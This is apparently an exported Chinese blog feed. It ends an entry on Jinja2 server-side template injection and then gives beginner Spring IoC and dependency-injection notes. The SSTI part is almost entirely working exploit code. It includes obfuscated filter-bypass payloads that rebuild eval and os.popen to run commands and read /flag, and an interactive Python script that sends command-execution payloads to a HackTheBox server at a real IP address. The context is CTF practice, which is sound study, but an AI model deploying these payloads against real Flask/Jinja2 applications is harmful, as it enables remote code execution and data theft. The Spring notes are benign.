<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a  =lipsum|lower|<span class="built_in">list</span>|random%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(<span class="keyword">in</span>=a,it=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(glo=a,bals=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(get=a,item=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> built=(a,a,<span class="built_in">dict</span>(bui=a,ltins=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ev=<span class="built_in">dict</span>(ev=a,al=b)|join %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> eev=  (x|attr(geti))(ev) %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;%<span class="built_in">set</span> oo=(<span class="built_in">dict</span>(o=a,s=b)|join)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="keyword">or</span>=<span class="built_in">dict</span>(<span class="keyword">or</span>=a,d=b)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">ord</span>=  (x|attr(geti))(<span class="keyword">or</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ch=<span class="built_in">dict</span>(c=a,hr=b)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cch=  (x|attr(geti))(ch) %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> f=<span class="built_in">dict</span>(F=a)|join%&#125;&#123;% <span class="built_in">set</span> m=<span class="built_in">dict</span>(m=a)|join%&#125;&#123;%<span class="built_in">set</span> sin=cch(<span class="built_in">ord</span>(m)-<span class="built_in">ord</span>(f))%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> R=<span class="built_in">dict</span>(R=a)|join%&#125;&#123;% <span class="built_in">set</span> z=<span class="built_in">dict</span>(z=a)|join%&#125;&#123;%<span class="built_in">set</span> kuoa=cch(<span class="built_in">ord</span>(z)-<span class="built_in">ord</span>(R))%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> Q=<span class="built_in">dict</span>(Q=a)|join%&#125;&#123;% <span class="built_in">set</span> z=<span class="built_in">dict</span>(z=a)|join%&#125;&#123;%<span class="built_in">set</span> kuob=cch(<span class="built_in">ord</span>(z)-<span class="built_in">ord</span>(Q))%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> L=<span class="built_in">dict</span>(L=a)|join%&#125;&#123;% <span class="built_in">set</span> z=<span class="built_in">dict</span>(z=a)|join%&#125;&#123;%<span class="built_in">set</span> dos=cch(<span class="built_in">ord</span>(z)-<span class="built_in">ord</span>(L))%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> arg=(a,a,<span class="built_in">dict</span>(imp=a,ort=b)|join,a,a,kuoa,sin,oo,sin,kuob,dos,<span class="built_in">dict</span>(sys=a,tem=b)|join,kuoa,sin,<span class="built_in">dict</span>(who=a,ami=b)|join,sin,kuob)|join()%&#125;&#123;&#123;arg&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123; eev(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;</span>) &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%%<span class="number">20</span><span class="built_in">set</span>%<span class="number">20</span>po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;&#123;% <span class="built_in">set</span> a  =lipsum|lower|<span class="built_in">list</span>|random%&#125;&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(<span class="keyword">in</span>=a,it=b)|join,a,a)|join()%&#125;&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(glo=a,bals=b)|join,a,a)|join()%&#125;&#123;% <span class="built_in">set</span> ge=(a,a,<span class="built_in">dict</span>(ge=a,titem=b)|join,a,a)|join()%&#125;&#123;% <span class="built_in">set</span> built=(a,a,<span class="built_in">dict</span>(bui=a,ltins=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> di=(a,a,<span class="built_in">dict</span>(di=a,ct=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(q|attr(ini)|attr(glo)|attr(ge))(built)%&#125;&#123;%<span class="built_in">set</span> ev=(<span class="built_in">dict</span>(ev=a,al=b)|join)%&#125;&#123;%<span class="built_in">set</span> fun=x|attr(ge)(ev)%&#125;</span><br><span class="line"></span><br><span class="line">&#123;%<span class="built_in">set</span> f=(<span class="built_in">dict</span>(fun=a,c=b)|join,a,<span class="built_in">dict</span>(glo=a,bals=b)|join)|join()%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> linecache=(<span class="built_in">dict</span>(line=a,cache=b)|join,a,<span class="built_in">dict</span>(glo=a,bals=b)|join)|join()%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> oo=(<span class="built_in">dict</span>(o=a,s=b)|join)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="keyword">or</span>=<span class="built_in">dict</span>(<span class="keyword">or</span>=a,d=b)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">ord</span>=  (x|attr(ge))(<span class="keyword">or</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ch=<span class="built_in">dict</span>(c=a,hr=b)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cch=  (x|attr(ge))(ch) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> f=<span class="built_in">dict</span>(F=a)|join%&#125;&#123;% <span class="built_in">set</span> m=<span class="built_in">dict</span>(m=a)|join%&#125;&#123;%<span class="built_in">set</span> sin=cch(<span class="built_in">ord</span>(m)-<span class="built_in">ord</span>(f))%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> R=<span class="built_in">dict</span>(R=a)|join%&#125;&#123;% <span class="built_in">set</span> z=<span class="built_in">dict</span>(z=a)|join%&#125;&#123;%<span class="built_in">set</span> kuoa=cch(<span class="built_in">ord</span>(z)-<span class="built_in">ord</span>(R))%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> Q=<span class="built_in">dict</span>(Q=a)|join%&#125;&#123;% <span class="built_in">set</span> z=<span class="built_in">dict</span>(z=a)|join%&#125;&#123;%<span class="built_in">set</span> kuob=cch(<span class="built_in">ord</span>(z)-<span class="built_in">ord</span>(Q))%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> L=<span class="built_in">dict</span>(L=a)|join%&#125;&#123;% <span class="built_in">set</span> z=<span class="built_in">dict</span>(z=a)|join%&#125;&#123;%<span class="built_in">set</span> dd=cch(<span class="built_in">ord</span>(z)-<span class="built_in">ord</span>(L))%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> Z=<span class="built_in">dict</span>(Z=a)|join%&#125;&#123;%<span class="built_in">set</span> spa=cch(<span class="built_in">ord</span>(z)-<span class="built_in">ord</span>(Z))%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> K=<span class="built_in">dict</span>(K=a)|join%&#125;&#123;% <span class="built_in">set</span> z=<span class="built_in">dict</span>(z=a)|join%&#125;&#123;%<span class="built_in">set</span> xie=cch(<span class="built_in">ord</span>(z)-<span class="built_in">ord</span>(K))%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> arg=(a,a,<span class="built_in">dict</span>(imp=a,ort=b)|join,a,a,kuoa,sin,oo,sin,kuob,dd,<span class="built_in">dict</span>(po=a,pen=b)|join,kuoa,sin,<span class="built_in">dict</span>(env=a)|join,sin,kuob,dd,<span class="built_in">dict</span>(rea=a,d=b)|join,kuoa,kuob)|join()%&#125;</span><br><span class="line">&#123;&#123;fun(arg)&#125;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="2-12-hackthebox的里面"><a href="#2-12-hackthebox的里面" class="headerlink" title="2.12 hackthebox的里面"></a>2.12 hackthebox的里面</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> flask_unsign</span><br><span class="line"></span><br><span class="line">Server =<span class="string">&quot;http://138.68.182.108:30171/&quot;</span></span><br><span class="line"><span class="keyword">if</span> requests.get(Server).status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmd = <span class="built_in">input</span> (<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            exit()</span><br><span class="line">        sess = requests.Session()</span><br><span class="line">        sess.get(Server+<span class="string">&quot;/?name=&#123;%+if+session.update(&#123;request.args.se:request.application.__globals__.__builtins__.__import__(request.args.os).popen(request.args.command).read()&#125;)+==+1+%&#125;&#123;%+endif+%&#125;&amp;se=asdf&amp;os=os&amp;command=&quot;</span>+cmd)</span><br><span class="line">        session = sess.cookies.get_dict()[<span class="string">&#x27;session&#x27;</span>]</span><br><span class="line">        print(flask_unsign.decode(<span class="built_in">str</span>(session))[<span class="string">&#x27;asdf&#x27;</span>].decode())</span><br></pre></td></tr></table></figure>





<h2 id="安恒阴间题目的通杀payload"><a href="#安恒阴间题目的通杀payload" class="headerlink" title="安恒阴间题目的通杀payload"></a>安恒阴间题目的通杀payload</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 首先构造出所需的数字: </span><br><span class="line">&#123;% set zero &#x3D; (self|int) %&#125;    # 0, 也可以使用lenght过滤器获取数字</span><br><span class="line">&#123;% set one &#x3D; (zero**zero)|int %&#125;    # 1</span><br><span class="line">&#123;% set two &#x3D; (zero-one-one)|abs %&#125;    # 2</span><br><span class="line">&#123;% set four &#x3D; (two*two)|int %&#125;    # 4</span><br><span class="line">&#123;% set five &#x3D; (two*two*two)-one-one-one %&#125;    # 5</span><br><span class="line">&#123;% set three &#x3D; five-one-one %&#125;    # 3</span><br><span class="line">&#123;% set nine &#x3D; (two*two*two*two-five-one-one) %&#125;    # 9</span><br><span class="line">&#123;% set seven &#x3D; (zero-one-one-five)|abs %&#125;    # 7</span><br><span class="line"></span><br><span class="line"># 构造出所需的各种字符与字符串: </span><br><span class="line">&#123;% set space &#x3D; self|string|min %&#125;    # 空格</span><br><span class="line">&#123;% set point &#x3D; self|float|string|min %&#125;    # .</span><br><span class="line"></span><br><span class="line">&#123;% set c &#x3D; dict(c&#x3D;aa)|reverse|first %&#125;    # 字符 c</span><br><span class="line">&#123;% set bfh &#x3D; self|string|urlencode|first %&#125;    # 百分号 %</span><br><span class="line">&#123;% set bfhc &#x3D; bfh~c %&#125;    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接</span><br><span class="line">&#123;% set slas &#x3D; bfhc%((four~seven)|int) %&#125;    # 使用%c构造斜杠 &#x2F;</span><br><span class="line">&#123;% set yin &#x3D; bfhc%((three~nine)|int) %&#125;    # 使用%c构造引号 &#39;</span><br><span class="line">&#123;% set xhx &#x3D; bfhc%((nine~five)|int) %&#125;    # 使用%c构造下划线 _</span><br><span class="line">&#123;% set right &#x3D; bfhc%((four~one)|int) %&#125;    # 使用%c构造右括号 )</span><br><span class="line">&#123;% set left &#x3D; bfhc%((four~zero)|int) %&#125;    # 使用%c构造左括号 (</span><br><span class="line"></span><br><span class="line">&#123;% set but &#x3D; dict(buil&#x3D;aa,tins&#x3D;dd)|join %&#125;    # builtins</span><br><span class="line">&#123;% set imp &#x3D; dict(imp&#x3D;aa,ort&#x3D;dd)|join %&#125;    # import</span><br><span class="line">&#123;% set pon &#x3D; dict(po&#x3D;aa,pen&#x3D;dd)|join %&#125;    # popen</span><br><span class="line">&#123;% set so &#x3D; dict(o&#x3D;aa,s&#x3D;dd)|join %&#125;    # os</span><br><span class="line">&#123;% set ca &#x3D; dict(ca&#x3D;aa,t&#x3D;dd)|join %&#125;    # cat</span><br><span class="line">&#123;% set flg &#x3D; dict(fl&#x3D;aa,ag&#x3D;dd)|join %&#125;    # flag</span><br><span class="line">&#123;% set ev &#x3D; dict(ev&#x3D;aa,al&#x3D;dd)|join %&#125;    # eval</span><br><span class="line">&#123;% set red &#x3D; dict(re&#x3D;aa,ad&#x3D;dd)|join %&#125;    # read</span><br><span class="line">&#123;% set bul &#x3D; xhx~xhx~but~xhx~xhx %&#125;    # __builtins__</span><br><span class="line"></span><br><span class="line">&#123;% set ini &#x3D; dict(ini&#x3D;aa,t&#x3D;bb)|join %&#125;    # init</span><br><span class="line">&#123;% set glo &#x3D; dict(glo&#x3D;aa,bals&#x3D;bb)|join %&#125;    # globals</span><br><span class="line">&#123;% set itm &#x3D; dict(ite&#x3D;aa,ms&#x3D;bb)|join %&#125;    # items</span><br><span class="line"></span><br><span class="line"># 将上面构造的字符或字符串拼接起来构造出 __import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read(): </span><br><span class="line">&#123;% set pld &#x3D; xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;</span><br><span class="line"></span><br><span class="line"># 然后将上面构造的各种变量添加到SSTI万能payload里面就行了: </span><br><span class="line">&#123;% for f,v in (whoami|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %&#125;    # globals</span><br><span class="line">	&#123;% if f &#x3D;&#x3D; bul %&#125; </span><br><span class="line">		&#123;% for a,b in (v|attr(itm))() %&#125;    # builtins</span><br><span class="line">			&#123;% if a &#x3D;&#x3D; ev %&#125;    # eval</span><br><span class="line">				&#123;&#123;b(pld)&#125;&#125;    # eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()&quot;)</span><br><span class="line">			&#123;% endif %&#125;</span><br><span class="line">		&#123;% endfor %&#125;</span><br><span class="line">	&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"># 最后的payload如下:</span><br><span class="line">&#123;% set zero &#x3D; (self|int) %&#125;&#123;% set one &#x3D; (zero**zero)|int %&#125;&#123;% set two &#x3D; (zero-one-one)|abs %&#125;&#123;% set four &#x3D; (two*two)|int %&#125;&#123;% set five &#x3D; (two*two*two)-one-one-one %&#125;&#123;% set three &#x3D; five-one-one %&#125;&#123;% set nine &#x3D; (two*two*two*two-five-one-one) %&#125;&#123;% set seven &#x3D; (zero-one-one-five)|abs %&#125;&#123;% set space &#x3D; self|string|min %&#125;&#123;% set point &#x3D; self|float|string|min %&#125;&#123;% set c &#x3D; dict(c&#x3D;aa)|reverse|first %&#125;&#123;% set bfh &#x3D; self|string|urlencode|first %&#125;&#123;% set bfhc &#x3D; bfh~c %&#125;&#123;% set slas &#x3D; bfhc%((four~seven)|int) %&#125;&#123;% set yin &#x3D; bfhc%((three~nine)|int) %&#125;&#123;% set xhx &#x3D; bfhc%((nine~five)|int) %&#125;&#123;% set right &#x3D; bfhc%((four~one)|int) %&#125;&#123;% set left &#x3D; bfhc%((four~zero)|int) %&#125;&#123;% set but &#x3D; dict(buil&#x3D;aa,tins&#x3D;dd)|join %&#125;&#123;% set imp &#x3D; dict(imp&#x3D;aa,ort&#x3D;dd)|join %&#125;&#123;% set pon &#x3D; dict(po&#x3D;aa,pen&#x3D;dd)|join %&#125;&#123;% set so &#x3D; dict(o&#x3D;aa,s&#x3D;dd)|join %&#125;&#123;% set ca &#x3D; dict(ca&#x3D;aa,t&#x3D;dd)|join %&#125;&#123;% set flg &#x3D; dict(fl&#x3D;aa,ag&#x3D;dd)|join %&#125;&#123;% set ev &#x3D; dict(ev&#x3D;aa,al&#x3D;dd)|join %&#125;&#123;% set red &#x3D; dict(re&#x3D;aa,ad&#x3D;dd)|join %&#125;&#123;% set bul &#x3D; xhx~xhx~but~xhx~xhx %&#125;&#123;% set ini &#x3D; dict(ini&#x3D;aa,t&#x3D;bb)|join %&#125;&#123;% set glo &#x3D; dict(glo&#x3D;aa,bals&#x3D;bb)|join %&#125;&#123;% set itm &#x3D; dict(ite&#x3D;aa,ms&#x3D;bb)|join %&#125;&#123;% set pld &#x3D; xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;&#123;% for f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %&#125;&#123;% if f &#x3D;&#x3D; bul %&#125;&#123;% for a,b in (v|attr(itm))() %&#125;&#123;% if a &#x3D;&#x3D; ev %&#125;&#123;&#123;b(pld)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring学习</title>
    <url>/2020/11/10/Spring%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><h3 id="从今天开始学Sping"><a href="#从今天开始学Sping" class="headerlink" title="从今天开始学Sping"></a>从今天开始学Sping</h3><h5 id="1-IOC理论推导："><a href="#1-IOC理论推导：" class="headerlink" title="1.IOC理论推导："></a>1.IOC理论推导：</h5><ul>
<li><p>UserDao接口</p>
</li>
<li><p>UserDaompl实现类</p>
</li>
<li><p>Userservice业务接口</p>
</li>
<li><p>UserServiceimpl 业务实现类</p>
<p>在之前的业务当中，用户的需求会修改我们的代码，导致代码难以维护，所以我们开始使用了set值植入，set接口，实现不用修改代码，用户只需要调用接口就可以了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceimp1</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserDao userDao = <span class="keyword">new</span> UserDaolmp1();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getUser</span><span class="params">()</span></span>&#123;</span><br><span class="line">        userDao.getuser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先前的代码，在我们调用UserDao的时候因为写死了拓展，所以无法灵活的调用，我们可以使用接口的思想解放</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserDao</span><span class="params">(UserDao userDao)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userDao = userDao;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getUser</span><span class="params">()</span></span>&#123;</span><br><span class="line">        userDao.getuser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    我们将之前写死的代码转变成了set方法，这样子当我们于main方法当中使用的时候：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        UserServiceimp1 userService = <span class="keyword">new</span> UserServiceimp1();</span><br><span class="line"></span><br><span class="line">        userService.setUserDao(<span class="keyword">new</span> UserDaoMysql());</span><br><span class="line">        userService.getUser();</span><br><span class="line"><span class="comment">//        用户实际调用业务层，dao层不需要接触</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用户只需要在set后面更改接口就可以了！</p>
<p>IOC的三层架构：Dao层负责实现方法，Service层负责调用Dao的方法，而main方法去调用Service的接口</p>
<p>使用该方法大大降低了业务的<strong>耦合性，</strong>使得业务的每一部分专心于做好自己的架构即可。</p>
<p><img src="Spring%E5%AD%A6%E4%B9%A0/image-20200620165913816.png" alt="image-20200620165913816"></p>
<h5 id="2-IOC的本质"><a href="#2-IOC的本质" class="headerlink" title="2.IOC的本质"></a>2.IOC的本质</h5><p>​    <strong>控制反转IoC</strong>(Inversion of Control),是一种设计思想，DI(依赖注入)是实现IoC的一种方法，也有人认为DI只是IoC的另-种说法。 没有IoC的程序中 ,我们使用面向对象编程 ,对象的创建 与对象间的依赖关系完全硬编码在程序中，对象的创建由程序自己控制，控制反转后将对象的创建转移给第三方，个人认为所谓控制反转就是:获得依赖对象的方式反转了。</p>
<p>​    而IOC就是Spring的核心思想！</p>
<h5 id="3-HelloSpring"><a href="#3-HelloSpring" class="headerlink" title="3.HelloSpring"></a>3.HelloSpring</h5><p>首先我们需要创建一个类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloSpring</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String str;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getStr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setStr</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.str = str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>+<span class="string">&quot;str=&quot;</span>+str+<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>创建beans.xml，写入如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--        使用spring创建对象，这些对象都称为bean--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ysllz.pojo.HelloSpring&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;str&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Spring&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--        属性--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在这里，Spring帮我们做了这么一个事情：</p>
<p>在java当中，我们创建类的时候都是 类 对象名 = new 对象；</p>
<p>而在Spring当中，id为注册的对象名，property当中即可调用类当中的方法，value用于给方法的变量赋值。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Mytest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        获取spring的上下文对象</span></span><br><span class="line">        ClassPathXmlApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line"><span class="comment">//        接下来我们用Spring的管理即可</span></span><br><span class="line">        HelloSpring hello = (HelloSpring) context.getBean(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(hello.tostring());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>重点就是一切交给Spring，一切函数不再由你调用，让Spring调用即可。</p>
<h5 id="4-IOC创建对象"><a href="#4-IOC创建对象" class="headerlink" title="4.IOC创建对象"></a>4.IOC创建对象</h5><p>​    1.默认直接创建的时候利用的无参构造方法</p>
<p>​    2.有参构造的时候我们有三种方式来对参数进行构造：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--   键对值的方式，最简单--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ysllz.pojo.HelloSpring&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;str&quot;</span> <span class="attr">value</span>=<span class="string">&quot;wuhu&quot;</span>/&gt;</span></span><br><span class="line">        </span><br><span class="line"> <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">value</span>=<span class="string">&quot;wuhu&quot;</span>/&gt;</span>  <span class="comment">&lt;!--        用下标来赋值--&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">value</span>=<span class="string">&quot;wuhu&quot;</span>/&gt;</span>  <span class="comment">&lt;!--        用类型来赋值，不推荐使用--&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>注意事项:</strong></p>
<p>​        在Spring当中，实际上当我们利用Spring进行Context的创建的时候，Spring已经将<strong>全部对象导入</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line"><span class="comment">//        接下来我们用Spring的管理即可</span></span><br><span class="line">HelloSpring hello = (HelloSpring) context.getBean(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">System.out.println(hello.tostring());</span><br></pre></td></tr></table></figure>

<p>也就是说，如果你的Bean当中即使含有多个类，Spring也将他们全部导入并初始化，用户想要什么去取出来即可。</p>
<h5 id="5-Spring的配置"><a href="#5-Spring的配置" class="headerlink" title="5.Spring的配置"></a>5.Spring的配置</h5><ul>
<li><p>别名(已没用了)</p>
</li>
<li><p>Bean的配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ysllz.pojo.HelloSpring&quot;</span> <span class="attr">name</span>=<span class="string">&quot;u1,u2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;str&quot;</span> <span class="attr">value</span>=<span class="string">&quot;www&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>在这里的id就是注册名，class就是调用类<strong>name已经可以取别名了！</strong></p>
</li>
<li><p>Import</p>
<p>便于多人运动，大伙一起开发的时候，就可以将他们包含在一起了~</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;beans.xml&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<h5 id="6-DI依赖注入"><a href="#6-DI依赖注入" class="headerlink" title="6.DI依赖注入"></a>6.DI依赖注入</h5><p>​        </p>
<h6 id="6-1构造方法注入"><a href="#6-1构造方法注入" class="headerlink" title="6.1构造方法注入"></a>6.1构造方法注入</h6><p>​    重写构造方法</p>
<h6 id="6-2set方法注入【重点】"><a href="#6-2set方法注入【重点】" class="headerlink" title="6.2set方法注入【重点】"></a>6.2set方法注入【重点】</h6><p>​    依赖：beans的对象依赖于容器！</p>
<p>​    注入：bead当中的所有属性·，由容器来注入。</p>
<p><strong>【环境搭建】</strong></p>
<p>​    1.复杂类型</p>
<pre><code> 2.真实测试对象</code></pre>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String string;</span><br><span class="line">    <span class="keyword">private</span> String[] book;</span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; hobbies;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,String&gt; card;</span><br><span class="line">    <span class="keyword">private</span> Set&lt;String&gt; games;</span><br><span class="line">    <span class="keyword">private</span> String wife;</span><br><span class="line">    <span class="keyword">private</span> Properties info;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    3.beans.xml</p>
